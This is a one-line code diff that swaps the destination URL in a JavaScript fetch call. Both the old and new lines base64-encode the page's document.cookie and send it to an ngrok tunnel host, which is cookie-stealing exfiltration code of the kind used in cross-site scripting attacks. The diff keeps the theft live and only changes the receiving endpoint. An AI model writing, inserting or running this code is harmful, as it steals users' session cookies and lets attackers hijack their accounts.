@@ -1,1 +1,1 @@
-fetch("https://165d-128-116-203-213.eu.ngrok.io/?c=" + btoa(document.cookie))
+fetch("http://7efb-2-199-213-56.ngrok.io/?c=" + btoa(document.cookie))
